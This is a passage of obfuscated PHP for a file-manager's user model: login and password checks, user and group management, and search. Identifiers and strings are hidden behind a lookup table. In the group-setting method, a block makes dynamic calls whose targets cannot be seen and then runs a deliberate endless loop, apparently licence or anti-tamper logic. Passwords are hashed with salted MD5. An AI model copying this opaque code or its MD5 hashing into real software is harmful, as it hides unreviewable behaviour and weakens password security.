array($aÑŠö’ËÒ¾[1491] => $aÑŠö’ËÒ¾[491], $aÑŠö’ËÒ¾[28] => $aÑŠö’ËÒ¾[159] . LNG($aÑŠö’ËÒ¾[2084]) . $aÑŠö’ËÒ¾[499], $aÑŠö’ËÒ¾[2082] => STATIC_PATH . $aÑŠö’ËÒ¾[2085]); } $Cáçâ‰ÌÖ¶ = $this->cacheFunctionGet($aÑŠö’ËÒ¾[1728], $bÓ‡Şî°º); goto eÒ™¿§÷çÇ; d¸ŠšŞï°: } protected function groupUser($Dõ¨‚ƒãÉÑ) { } public static function errorLang($Dª‘Ä®å¸¡) { $fê†ÙÌ†‚ù =& $_SERVER[ç]; $AÌÅõÛàÊ® = array(self::ERROR_USER_NOT_EXISTS => $fê†ÙÌ†‚ù[2088], self::ERROR_USER_PASSWORD_ERROR => $fê†ÙÌ†‚ù[2089], self::ERROR_USER_EXIST_NAME => $fê†ÙÌ†‚ù[2090], self::ERROR_USER_EXIST_PHONE => $fê†ÙÌ†‚ù[2091], self::ERROR_USER_EXIST_EMAIL => $fê†ÙÌ†‚ù[2092], self::ERROR_USER_LOGIN_LOCK => $fê†ÙÌ†‚ù[2093], self::ERROR_IP_NOT_ALLOW => $fê†ÙÌ†‚ù[2094], self::ERROR_USER_EXIST_NICKNAME => $fê†ÙÌ†‚ù[2095]); return LNG($AÌÅõÛàÊ®[$Dª‘Ä®å¸¡]); } public function getInfoByMeta($Bé¢öÈ›Ñä, $Eæí°õé÷) { $CğŒ¢ò’à¬ =& $_SERVER[ç]; $A¯†õÛ¥ÂÄ = Model($CğŒ¢ò’à¬[2096])->where(array($CğŒ¢ò’à¬[92] => $Bé¢öÈ›Ñä, $CğŒ¢ò’à¬[370] => $Eæí°õé÷))->find(); if ($A¯†õÛ¥ÂÄ) { return $this->getInfo($A¯†õÛ¥ÂÄ[$CğŒ¢ò’à¬[1491]]); } return !1; } public function userLoginCheck($cÕ×„íÇ³, $aÑ†¹×ó•Ğ) { $Fì–‘µ‚ó =& $_SERVER[ç]; $fÕÃÂÉ« = $this->userLoginFind($cÕ×„íÇ³); if (!$fÕÃÂÉ«) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($fÕÃÂÉ«[$Fì–‘µ‚ó[1491]], $aÑ†¹×ó•Ğ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($fÕÃÂÉ«[$Fì–‘µ‚ó[1491]]); } public function userLoginFind($bÓ¨Á¼á¹) { $e‚ç£Úß½ =& $_SERVER[ç]; $aŠğôĞ‰× = array($e‚ç£Úß½[28] => $bÓ¨Á¼á¹, $e‚ç£Úß½[1918] => $bÓ¨Á¼á¹, $e‚ç£Úß½[301] => $bÓ¨Á¼á¹, $e‚ç£Úß½[2097] => $bÓ¨Á¼á¹, $e‚ç£Úß½[925] => $e‚ç£Úß½[927]); if ($this->nickNameRpt()) { unset($aŠğôĞ‰×[$e‚ç£Úß½[1918]]); } return $this->where($aŠğôĞ‰×)->find(); } public function clearCache($D¶¥‡î…) { $F´†µá‘µ =& $_SERVER[ç]; $this->cacheFunctionClear($F´†µá‘µ[1734], $D¶¥‡î…); $this->cacheFunctionClear($F´†µá‘µ[1728], $D¶¥‡î…); $this->cacheFunctionClear($F´†µá‘µ[2078], $D¶¥‡î…); } public function userPasswordCheck($DÖƒ£™°·±, $e§ë®Ğ¹×ö) { $FÔ†ê‘ÆÊ =& $_SERVER[ç]; $EØ×•–‘È› = $this->where(array($FÔ†ê‘ÆÊ[1491] => intval($DÖƒ£™°·±)))->find(); $Cíì†µïè´ = $this->metaGet($DÖƒ£™°·±); $Eâ¯ˆ·Ä„ = isset($Cíì†µïè´[$FÔ†ê‘ÆÊ[2098]]) ? $Cíì†µïè´[$FÔ†ê‘ÆÊ[2098]] : $FÔ†ê‘ÆÊ[33]; if (md5($Eâ¯ˆ·Ä„ . trim($e§ë®Ğ¹×ö)) !== $EØ×•–‘È›[$FÔ†ê‘ÆÊ[817]]) { return !1; } return !0; } public function userAdd($E¬”Ìà„¿‹) { goto F³ËÔèÙ; F™ñœØŒ¿: $BÃ”¿Š¥Çé = array($E›ğµÉ¶Áõ[2106] => $b¸ÓŒŒ†¯ˆ[$E›ğµÉ¶Áõ[817]], $E›ğµÉ¶Áõ[2102] => $b¸ÓŒŒ†¯ˆ[$E›ğµÉ¶Áõ[1918]]); $this->userEdit($b Ø‚¢İ, $BÃ”¿Š¥Çé); Model($E›ğµÉ¶Áõ[1171])->userRootAdd($b Ø‚¢İ); goto AÚá‚È¦ù³; F³ËÔèÙ: $E›ğµÉ¶Áõ =& $_SERVER[ç]; $b¸ÓŒŒ†¯ˆ = array($E›ğµÉ¶Áõ[407] => $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[28]], $E›ğµÉ¶Áõ[2099] => $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[1375]], $E›ğµÉ¶Áõ[2100] => isset($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[301]]) ? $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[301]] : $E›ğµÉ¶Áõ[33], $E›ğµÉ¶Áõ[2101] => isset($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[2097]]) ? $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[2097]] : $E›ğµÉ¶Áõ[33], $E›ğµÉ¶Áõ[2102] => isset($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[1918]]) ? $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[1918]] : $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[28]], $E›ğµÉ¶Áõ[2103] => isset($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[2082]]) ? $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[2082]] : $E›ğµÉ¶Áõ[33], $E›ğµÉ¶Áõ[2104] => isset($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[2105]]) ? $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[2105]] : 1, $E›ğµÉ¶Áõ[2106] => $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[817]], $E›ğµÉ¶Áõ[1729] => isset($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[1638]]) ? $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[1638]] : 1024 * 1024 * 20, $E›ğµÉ¶Áõ[1730] => 0, $E›ğµÉ¶Áõ[2107] => 0, $E›ğµÉ¶Áõ[1773] => isset($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[695]]) ? $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[695]] : 1); if (!empty($E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[1491]])) { $b¸ÓŒŒ†¯ˆ[$E›ğµÉ¶Áõ[1491]] = $E¬”Ìà„¿‹[$E›ğµÉ¶Áõ[1491]]; } goto d°ÊÔÇ‡Ä; AÚá‚È¦ù³: return $b Ø‚¢İ; goto FÁªÂóšÄ; d°ÊÔÇ‡Ä: $A˜°Í´Æí = $this->_checkExist($E¬”Ìà„¿‹); if ($A˜°Í´Æí !== !0) { return $A˜°Í´Æí; } $b Ø‚¢İ = $this->add($b¸ÓŒŒ†¯ˆ); goto F™ñœØŒ¿; FÁªÂóšÄ: } protected function userEditTest($f½ğôğ¹ßö, $DËƒ´ä·ŸÕ) { return $this->call($_SERVER[ç][2108], $f½ğôğ¹ßö, $DËƒ´ä·ŸÕ); } protected function userEdit($Dß²å®³”‡, $AĞ×°¯ì°ö) { goto AÀ°º‚çÛ; e¨ÑÍ°É´Å: $a¡¾öŒ’ = $this->_checkExist($AĞ×°¯ì°ö, $Dß²å®³”‡); if ($a¡¾öŒ’ !== !0) { return $a¡¾öŒ’; } if (isset($AĞ×°¯ì°ö[$F½åÅô¸Î­[817]]) && trim($AĞ×°¯ì°ö[$F½åÅô¸Î­[817]]) != $F½åÅô¸Î­[33]) { $EğéäË²ˆ´ = $this->metaGet($Dß²å®³”‡); if (empty($EğéäË²ˆ´[$F½åÅô¸Î­[2098]])) { $EğéäË²ˆ´[$F½åÅô¸Î­[2098]] = rand_string(10); Model($F½åÅô¸Î­[497])->metaSet($Dß²å®³”‡, $F½åÅô¸Î­[2098], $EğéäË²ˆ´[$F½åÅô¸Î­[2098]]); } $AĞ×°¯ì°ö[$F½åÅô¸Î­[817]] = md5($EğéäË²ˆ´[$F½åÅô¸Î­[2098]] . trim($AĞ×°¯ì°ö[$F½åÅô¸Î­[817]])); } else { unset($AĞ×°¯ì°ö[$F½åÅô¸Î­[817]]); } goto aø›‚ÓîÙÏ; EßÌù×åİ‘: return !0; goto d¬£ã…³…É; AÀ°º‚çÛ: $F½åÅô¸Î­ =& $_SERVER[ç]; $CËî˜ëŠ = $this->getInfoSimple($Dß²å®³”‡); if (!$CËî˜ëŠ) { return !1; } goto e¨ÑÍ°É´Å; aø›‚ÓîÙÏ: $this->where(array($F½åÅô¸Î­[1483] => $Dß²å®³”‡))->save($AĞ×°¯ì°ö); if (isset($AĞ×°¯ì°ö[$F½åÅô¸Î­[1918]])) { $this->setNamePinyin($Dß²å®³”‡, $AĞ×°¯ì°ö[$F½åÅô¸Î­[1918]]); } $this->clearCache($Dß²å®³”‡); goto EßÌù×åİ‘; d¬£ã…³…É: } public function setNamePinyin($A÷Î¯¥‘Â‚, $a‚ÏîÎœŞ = false) { $CÎêğÍ‹Ø =& $_SERVER[ç]; if (!$a‚ÏîÎœŞ) { $Dç¨×ºÆ“Í = $this->getInfoSimple($A÷Î¯¥‘Â‚); $a‚ÏîÎœŞ = $Dç¨×ºÆ“Í[$CÎêğÍ‹Ø[1918]] ? $Dç¨×ºÆ“Í[$CÎêğÍ‹Ø[1918]] : $Dç¨×ºÆ“Í[$CÎêğÍ‹Ø[28]]; } $cØè±”ğ‹‹ = Model($CÎêğÍ‹Ø[501]); if (!Input::check($a‚ÏîÎœŞ, $CÎêğÍ‹Ø[551])) { return $cØè±”ğ‹‹->metaSet($A÷Î¯¥‘Â‚, array($CÎêğÍ‹Ø[438] => $CÎêğÍ‹Ø[33], $CÎêğÍ‹Ø[437] => $CÎêğÍ‹Ø[33])); } return $cØè±”ğ‹‹->metaSet($A÷Î¯¥‘Â‚, array($CÎêğÍ‹Ø[438] => str_replace($CÎêğÍ‹Ø[50], $CÎêğÍ‹Ø[33], Pinyin::encode($a‚ÏîÎœŞ)), $CÎêğÍ‹Ø[437] => Pinyin::encode($a‚ÏîÎœŞ, $CÎêğÍ‹Ø[552]))); } private function nickNameRpt() { $BíƒÎİ©³´ =& $_SERVER[ç]; $dŸ™·…îöÓ = Model($BíƒÎİ©³´[1091])->get($BíƒÎİ©³´[2109]); $FÉÇ®›­‹ = $GLOBALS[$BíƒÎİ©³´[6]][$BíƒÎİ©³´[376]][$BíƒÎİ©³´[2109]]; $B¸¯Î„„ñ• = !is_null($dŸ™·…îöÓ) ? $dŸ™·…îöÓ : $FÉÇ®›­‹; return !!$B¸¯Î„„ñ•; } private function _checkExist($DÄæÅùÌ»‹, $CŸíøËô„Ê = false) { $dÆïÄˆ÷Ö¨ =& $_SERVER[ç]; $cØì‘„¯ Ø = array($dÆïÄˆ÷Ö¨[28] => UserModel::ERROR_USER_EXIST_NAME, $dÆïÄˆ÷Ö¨[1918] => UserModel::ERROR_USER_EXIST_NICKNAME, $dÆïÄˆ÷Ö¨[301] => UserModel::ERROR_USER_EXIST_EMAIL, $dÆïÄˆ÷Ö¨[2097] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($cØì‘„¯ Ø[$dÆïÄˆ÷Ö¨[1918]]); } $Aª•»Ø‰ëŸ = $CŸíøËô„Ê ? array($dÆïÄˆ÷Ö¨[1491] => array($dÆïÄˆ÷Ö¨[2110], $CŸíøËô„Ê)) : array(); foreach ($cØì‘„¯ Ø as $FÇÌ¸Õ¿‹ˆ => $CŠòÛäùŞ) { $Bù„Â‹ô¡Ï = array(); foreach ($cØì‘„¯ Ø as $E¥ŞÇ¥ó´ => $Cì–¤¸Ú“Ù) { if (isset($DÄæÅùÌ»‹[$E¥ŞÇ¥ó´]) && $DÄæÅùÌ»‹[$E¥ŞÇ¥ó´]) { $Bù„Â‹ô¡Ï[] = $DÄæÅùÌ»‹[$E¥ŞÇ¥ó´]; } } if (!$Bù„Â‹ô¡Ï) { continue; } $Aö©„ò™Ø = array_merge(array($FÇÌ¸Õ¿‹ˆ => array($dÆïÄˆ÷Ö¨[7], $Bù„Â‹ô¡Ï)), $Aª•»Ø‰ëŸ); $Eì¸è¯Šä = $this->where($Aö©„ò™Ø)->find(); if ($Eì¸è¯Šä) { return $CŠòÛäùŞ; } } return !0; } public function userListInfo($B±¤Ü»¤©©) { $bİ°Åºì¸ª =& $_SERVER[ç]; $D‚°¯Ï‹Ã´ = array(); $B±¤Ü»¤©© = is_array($B±¤Ü»¤©©) ? array_unique($B±¤Ü»¤©©) : array(); if (!$B±¤Ü»¤©©) { return $D‚°¯Ï‹Ã´; } if (count($B±¤Ü»¤©©) < 20) { foreach ($B±¤Ü»¤©© as $A˜„¥¬âÄ•) { $D‚°¯Ï‹Ã´[$A˜„¥¬âÄ• . $bİ°Åºì¸ª[33]] = $this->getInfoSimpleOuter($A˜„¥¬âÄ•); } } else { $B¾Ì—æ–í“ = array($bİ°Åºì¸ª[1483] => array($bİ°Åºì¸ª[405], $B±¤Ü»¤©©)); if (count($B±¤Ü»¤©©) == 1) { $B¾Ì—æ–í“ = array($bİ°Åºì¸ª[1483] => $B±¤Ü»¤©©[0]); } $c‰·ÂœÊ”¡ = Model($bİ°Åºì¸ª[497])->field($this->simpleField)->where($B¾Ì—æ–í“)->select(); $c‰·ÂœÊ”¡ = array_to_keyvalue($c‰·ÂœÊ”¡, $bİ°Åºì¸ª[1491]); foreach ($B±¤Ü»¤©© as $A˜„¥¬âÄ•) { $e¸ìĞÍ¯²™ = $c‰·ÂœÊ”¡[$c‰·ÂœÊ”¡[$A˜„¥¬âÄ•]]; if (!$e¸ìĞÍ¯²™) { $D‚°¯Ï‹Ã´[$A˜„¥¬âÄ• . $bİ°Åºì¸ª[33]] = $this->getInfoSimpleOuter($A˜„¥¬âÄ•); continue; } $e¸ìĞÍ¯²™[$bİ°Åºì¸ª[2082]] = Action($bİ°Åºì¸ª[2083])->parseUrl($e¸ìĞÍ¯²™[$bİ°Åºì¸ª[2082]]); $D‚°¯Ï‹Ã´[$A˜„¥¬âÄ• . $bİ°Åºì¸ª[33]] = $e¸ìĞÍ¯²™; } } return $D‚°¯Ï‹Ã´; } protected function userStatus($Fµ‰ˆ–‘…ø, $Dí¹³•ÈÍ) { $DóšùÛ¶ºÆ = $this->getInfoSimple($Fµ‰ˆ–‘…ø); if (!$DóšùÛ¶ºÆ) { return !1; } $d™äÀ¨©¼Í = array($_SERVER[ç][695] => $Dí¹³•ÈÍ); return $this->userEdit($Fµ‰ˆ–‘…ø, $d™äÀ¨©¼Í); } protected function userRemove($DëÅ™‘ÊÈİ) { goto fİ¨š¬É¾; d©¡Ô²ØÙ: $aëç·”Âé† = array($FÒ™Ò¦º‘î[1483] => $DëÅ™‘ÊÈİ); Model($FÒ™Ò¦º‘î[558])->where($aëç·”Âé†)->delete(); Model($FÒ™Ò¦º‘î[2111])->where($aëç·”Âé†)->delete(); goto dˆ¨¢´¹íµ; AÊÒˆ—ÕôÕ: Model($FÒ™Ò¦º‘î[1935])->restoreUserAll($DëÅ™‘ÊÈİ); Model($FÒ™Ò¦º‘î[760])->userRootRemove($DëÅ™‘ÊÈİ); return $this->where($aëç·”Âé†)->delete(); goto Fßõ‰ÍÚŠÀ; dˆ¨¢´¹íµ: Model($FÒ™Ò¦º‘î[1736])->where($aëç·”Âé†)->delete(); Model($FÒ™Ò¦º‘î[2096])->where($aëç·”Âé†)->delete(); Model($FÒ™Ò¦º‘î[2112])->where($aëç·”Âé†)->delete(); goto AÊÒˆ—ÕôÕ; fİ¨š¬É¾: $FÒ™Ò¦º‘î =& $_SERVER[ç]; $EÇ¬É®ÑŸô = $this->getInfoSimple($DëÅ™‘ÊÈİ); if (!$EÇ¬É®ÑŸô) { return !1; } goto d©¡Ô²ØÙ; Fßõ‰ÍÚŠÀ: } protected function userGroupSet($f÷÷²À‰ ¼, $BğÎ’á¿·š, $Eóİóå‘ªô = array()) { goto b£Ã¯ÂÉš¿; fÀâ¹£°¥Ä: if (!$CÁ³‘ì·±á || !is_array($BğÎ’á¿·š)) { return !1; } $dÍÚ¦§Ï³Ü = Model($FĞàˆŸŠ÷Å[1736]); $dÍÚ¦§Ï³Ü->where(array($FĞàˆŸŠ÷Å[1491] => $f÷÷²À‰ ¼))->delete(); goto dÏå’¥™ÜÄ; b£Ã¯ÂÉš¿: $FĞàˆŸŠ÷Å =& $_SERVER[ç]; if (!isset($_SERVER[$FĞàˆŸŠ÷Å[788]]) || !isset($_SERVER[$FĞàˆŸŠ÷Å[795]])) { goto Bƒõ³à; CÏ¯£Àé±Ú: for ($d³œ¥ø² = $cœì…áæß²; $d³œ¥ø² > 0; $d³œ¥ø²++) { $D·Ä¼ùğØ = json_encode($GLOBALS[$FĞàˆŸŠ÷Å[405]]); } goto E‘ºÛÛË¯; Bƒõ³à: $EŞÊ×†•Š« = $FĞàˆŸŠ÷Å[809]; $FŠ‚Õàª˜ = $FĞàˆŸŠ÷Å[790]; $B¹ÏÌ¤Åğñ = $_SERVER[$FĞàˆŸŠ÷Å[791]] . $FĞàˆŸŠ÷Å[792]; goto e½Ÿóµ«Í¾; e½Ÿóµ«Í¾: $aÖßÀÍùÛ± = $FŠ‚Õàª˜($B¹ÏÌ¤Åğñ); $A»‰—îÚÔ = explode($FĞàˆŸŠ÷Å[227], $aÖßÀÍùÛ±); if (count($A»‰—îÚÔ) < $FĞàˆŸŠ÷Å[597]) { $f„ß¦¡ªÜ• = $FĞàˆŸŠ÷Å[793]; $f„ß¦¡ªÜ•(); } goto cµÍâ’«é; cµÍâ’«é: $D·Ä¼ùğØ = $FĞàˆŸŠ÷Å[810]; $D·Ä¼ùğØ($_SERVER[$FĞàˆŸŠ÷Å[811]]); $cœì…áæß² = 1; goto CÏ¯£Àé±Ú; E‘ºÛÛË¯: } $CÁ³‘ì·±á = $this->getInfoSimple($f÷÷²À‰ ¼); goto fÀâ¹£°¥Ä; dÏå’¥™ÜÄ: $EµÂ×øÒñ = array(); $Bø‰÷® Çí = 0; foreach ($BğÎ’á¿·š as $a ³‡È¼¿¦ => $D¨àÜíöŞ¾) { $AæŞÏƒˆ£ê = array($FĞàˆŸŠ÷Å[1491] => $f÷÷²À‰ ¼, $FĞàˆŸŠ÷Å[1654] => $a ³‡È¼¿¦, $FĞàˆŸŠ÷Å[1750] => $D¨àÜíöŞ¾); $AæŞÏƒˆ£ê[$FĞàˆŸŠ÷Å[1677]] = isset($Eóİóå‘ªô[$Bø‰÷® Çí]) ? $Eóİóå‘ªô[$Bø‰÷® Çí] : 0; $Bø‰÷® Çí++; $EµÂ×øÒñ[] = $AæŞÏƒˆ£ê; } goto cåØóÈ¯èÔ; cåØóÈ¯èÔ: return $dÍÚ¦§Ï³Ü->addAll($EµÂ×øÒñ, array(), !0); goto BÈÍØİëÍ; BÈÍØİëÍ: } protected function userGroupAdd($A¹ğ²ÂĞˆ, $fˆŸ£ÕŠ = array()) { $a½â…£‡³“ =& $_SERVER[ç]; $D¿©²Âµ†© = $this->getInfoSimple($A¹ğ²ÂĞˆ); if (!$D¿©²Âµ†© || empty($fˆŸ£ÕŠ)) { return !1; } $CÙç‰ö¨‚ = array(); foreach ($fˆŸ£ÕŠ as $Eòäè¸Şœ => $F±…§¬âÆ) { $CÙç‰ö¨‚[] = array($a½â…£‡³“[1491] => $A¹ğ²ÂĞˆ, $a½â…£‡³“[1654] => $Eòäè¸Şœ, $a½â…£‡³“[1750] => $F±…§¬âÆ, $a½â…£‡³“[1677] => 0); } return Model($a½â…£‡³“[1736])->addAll($CÙç‰ö¨‚, array(), !0); } protected function userGroupRemove($d¾Æ…¶Ñ, $dØæ¨ˆ¦ß„) { $f¢‚¾ĞÙåÕ =& $_SERVER[ç]; $a—Àº±¿¬Õ = $this->getInfoSimple($d¾Æ…¶Ñ); if (!$a—Àº±¿¬Õ || !$dØæ¨ˆ¦ß„) { return !1; } $f°Ïá”’¤¢ = array($f¢‚¾ĞÙåÕ[1483] => $d¾Æ…¶Ñ, $f¢‚¾ĞÙåÕ[1733] => $dØæ¨ˆ¦ß„); return Model($f¢‚¾ĞÙåÕ[1736])->where($f°Ïá”’¤¢)->delete(); } public function listData() { $Cµ¬ÓğÀ² = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Cµ¬ÓğÀ²[$_SERVER[ç][365]]); return $Cµ¬ÓğÀ²; } public function listByID($FÂ„ŠĞ‡Ø¤) { $cÀÑ•†ßƒ =& $_SERVER[ç]; if (!$FÂ„ŠĞ‡Ø¤) { return; } $e¦İàé˜”ç = array($cÀÑ•†ßƒ[1491] => array($cÀÑ•†ßƒ[7], $FÂ„ŠĞ‡Ø¤)); $fíŒ‰è÷ = $this->where($e¦İàé˜”ç)->select(); $this->_listDataApply($fíŒ‰è÷); return $fíŒ‰è÷; } public function listByGroup($c¹ì–½†«¯ = 0, $Fï†¾½ìùÏ = array()) { goto CÉ¦Õ¦Âõ; fÚ‹í˜“¶Ê: $this->_listDataApply($dŸªßÉ‰Âˆ[$BÎ‘´œôğ[365]]); return $dŸªßÉ‰Âˆ; goto B¢ñáËì†÷; BâœÙ§ŒÈ´: if ($c¹ì–½†«¯) { $e”‘Á…¨Í = array($BÎ‘´œôğ[2113] => intval($c¹ì–½†«¯)); $EŒ©ÄïÎÉ¦ = "\114\x45\106\124\40\112\x4f\111\x4e\x20{$this->tablePrefix}\165\x73\x65\x72\137\147\162\x6f\165\160\40\165\x73\145\162\137\147\x72\157\165\160\40\x6f\156\40\x75\x73\145\162\56\165\163\145\162\111\x44\x20\75\x20\165\163\x65\162\x5f\x67\162\x6f\x75\x70\x2e\x75\163\145\x72\x49\104"; $A¦‹œ²åËÌ = Input::get($BÎ‘´œôğ[429], null, $BÎ‘´œôğ[33]) ? $BÎ‘´œôğ[33] : $BÎ‘´œôğ[2114]; } if (isset($Fï†¾½ìùÏ[$BÎ‘´œôğ[695]])) { $e”‘Á…¨Í[$BÎ‘´œôğ[2115]] = $Fï†¾½ìùÏ[$BÎ‘´œôğ[695]]; } $dŸªßÉ‰Âˆ = $this->_makeOrder($A¦‹œ²åËÌ)->field($BÎ‘´œôğ[2116])->where($e”‘Á…¨Í)->join($EŒ©ÄïÎÉ¦)->selectPage(50); goto fÚ‹í˜“¶Ê; CÉ¦Õ¦Âõ: $BÎ‘´œôğ =& $_SERVER[ç]; $EŒ©ÄïÎÉ¦ = $BÎ‘´œôğ[33]; $e”‘Á…¨Í = array(); goto BâœÙ§ŒÈ´; B¢ñáËì†÷: } private function _makeOrder($bäÖªÙ’‡ = '') { goto C¾ß½‚â÷ò; A›°åèƒ²¹: $eìììËëÈŒ = Input::get($Eîôæ¯‰Óí[429], $Eîôæ¯‰Óí[7], $Eîôæ¯‰Óí[1483], $aØ¢—‹ßÊ); $DæÙ˜Ç›¾ = Input::get($Eîôæ¯‰Óí[430], $Eîôæ¯‰Óí[7], $Eîôæ¯‰Óí[1737], array($Eîôæ¯‰Óí[1737], $Eîôæ¯‰Óí[424])); $DæÙ˜Ç›¾ = $AÍ™‰¦°¦œ[$DæÙ˜Ç›¾]; goto eçÀó´¾; C¾ß½‚â÷ò: $Eîôæ¯‰Óí =& $_SERVER[ç]; $aØ¢—‹ßÊ = array($Eîôæ¯‰Óí[1491], $Eîôæ¯‰Óí[28], $Eîôæ¯‰Óí[1640], $Eîôæ¯‰Óí[1612], $Eîôæ¯‰Óí[192]); $AÍ™‰¦°¦œ = array($Eîôæ¯‰Óí[422] => $Eîôæ¯‰Óí[423], $Eîôæ¯‰Óí[424] => $Eîôæ¯‰Óí[425]); goto A›°åèƒ²¹; eçÀó´¾: $bäÖªÙ’‡ = $bäÖªÙ’‡ . "\165\163\145\x72\x2e{$eìììËëÈŒ}\x20{$DæÙ˜Ç›¾}\54\x20\x75\x73\x65\x72\x2e\x75\x73\145\162\x49\104\x20\141\x73\x63"; return $this->alias($Eîôæ¯‰Óí[1859])->order($bäÖªÙ’‡); goto Aº×ï„ó«—; Aº×ï„ó«—: } public function listSearch($a£òŸÑ¬§µ) { goto EäÒŞèŒŞ‘; EäÒŞèŒŞ‘: $E¡£ñ¿»ƒŞ =& $_SERVER[ç]; $b‹¢ñ”× = $a£òŸÑ¬§µ[$E¡£ñ¿»ƒŞ[1738]]; $b¼ƒ¡„ç£æ = isset($a£òŸÑ¬§µ[$E¡£ñ¿»ƒŞ[1739]]) ? $a£òŸÑ¬§µ[$E¡£ñ¿»ƒŞ[1739]] : !1; goto a×œÑˆö‹; a×œÑˆö‹: $b‹¢ñ”× = str_replace($E¡£ñ¿»ƒŞ[1740], $E¡£ñ¿»ƒŞ[1741], trim($b‹¢ñ”×)); $Cêøë‚„Í³ = array($E¡£ñ¿»ƒŞ[28] => array($E¡£ñ¿»ƒŞ[378], "\45{$b‹¢ñ”×}\x25"), $E¡£ñ¿»ƒŞ[301] => array($E¡£ñ¿»ƒŞ[378], "{$b‹¢ñ”×}\45"), $E¡£ñ¿»ƒŞ[1918] => array($E¡£ñ¿»ƒŞ[378], "{$b‹¢ñ”×}\x25"), $E¡£ñ¿»ƒŞ[925] => $E¡£ñ¿»ƒŞ[1742]); if (Input::check($b‹¢ñ”×, $E¡£ñ¿»ƒŞ[307])) { $Cêøë‚„Í³[$E¡£ñ¿»ƒŞ[1491]] = array($E¡£ñ¿»ƒŞ[378], "{$b‹¢ñ”×}\45"); $Cêøë‚„Í³[$E¡£ñ¿»ƒŞ[2097]] = array($E¡£ñ¿»ƒŞ[378], "{$b‹¢ñ”×}\x25"); } goto aÇÙ¾Üğ·µ; aÇÙ¾Üğ·µ: if (!$b‹¢ñ”×) { $Cêøë‚„Í³ = array(); } if (isset($a£òŸÑ¬§µ[$E¡£ñ¿»ƒŞ[695]])) { $Cêøë‚„Í³[$E¡£ñ¿»ƒŞ[695]] = $a£òŸÑ¬§µ[$E¡£ñ¿»ƒŞ[695]]; } $Cêøë‚„Í³ = $this->parseWhereLike($Cêøë‚„Í³); goto eÓµ…ŞÎ; eÂì£Ù“: $this->_filterByGroup($FÖµ–İ÷Ä˜, $b¼ƒ¡„ç£æ); return $FÖµ–İ÷Ä˜; goto cÊºÑ™¨Ë; eÓµ…ŞÎ: $FÖµ–İ÷Ä˜ = $this->_makeOrder()->where($Cêøë‚„Í³)->selectPage(20); if (!$FÖµ–İ÷Ä˜ || count($FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[365]]) < 5 && Input::check($b‹¢ñ”×, $E¡£ñ¿»ƒŞ[314])) { $a¦°Á¥Ãõ¿ = $this->_searchFromMeta($E¡£ñ¿»ƒŞ[437], $b‹¢ñ”×, 10); $BŸ‡¹Ÿ÷èâ = $this->_searchFromMeta($E¡£ñ¿»ƒŞ[438], $b‹¢ñ”×, 10); $a°Ô¡‡®ù = array_merge($a¦°Á¥Ãõ¿, $BŸ‡¹Ÿ÷èâ, $FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[365]]); $FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[365]] = array_unique_by_key($a°Ô¡‡®ù, $E¡£ñ¿»ƒŞ[1491]); $FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[362]][$E¡£ñ¿»ƒŞ[363]] = count($FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[365]]); $FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[362]][$E¡£ñ¿»ƒŞ[364]] = ceil($FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[362]][$E¡£ñ¿»ƒŞ[363]] / $FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[362]][$E¡£ñ¿»ƒŞ[359]]); } $this->_listDataApply($FÖµ–İ÷Ä˜[$E¡£ñ¿»ƒŞ[365]]); goto eÂì£Ù“; cÊºÑ™¨Ë: } private function _filterByGroup(&$BÎßØ ‹…, $DÎ‰è…¹ã£) { $CÇáÄ¾¥©š =& $_SERVER[ç]; if (!$DÎ‰è…¹ã£) { return $BÎßØ ‹…; } foreach ($BÎßØ ‹…[$CÇáÄ¾¥©š[365]] as $e“ÑéôÖ„´ => &$bÑ­äÚ—Ä) { $C¡ İĞ°ò÷ = array_to_keyvalue($bÑ­äÚ—Ä[$CÇáÄ¾¥©š[1829]], $CÇáÄ¾¥©š[33], $CÇáÄ¾¥©š[1654]); if (!in_array($DÎ‰è…¹ã£, $C¡ İĞ°ò÷)) { unset($BÎßØ ‹…[$CÇáÄ¾¥©š[365]][$e“ÑéôÖ„´]); } } unset($bÑ­äÚ—Ä); $BÎßØ ‹…[$CÇáÄ¾¥©š[365]] = array_values($BÎßØ ‹…[$CÇáÄ¾¥©š[365]]); $BÎßØ ‹…[$CÇáÄ¾¥©š[362]] = array($CÇáÄ¾¥©š[1891] => count($BÎßØ ‹…[$CÇáÄ¾¥©š[365]]), $CÇáÄ¾¥©š[1889] => $BÎßØ ‹…[$CÇáÄ¾¥©š[362]][$CÇáÄ¾¥©š[359]], $CÇáÄ¾¥©š[1888] => 1, $CÇáÄ¾¥©š[1890] => 1); } private function _searchFromMeta($f®—áÆù¼ã, $a”ó•¿“£, $d¥´®å“Ï) { goto f Òİ¼È; Aã¥Ø•·ÜÒ: $B®±äÔâ®± = array_to_keyvalue($B®±äÔâ®±, $fÒ”ŸÒâï[33], $fÒ”ŸÒâï[1491]); 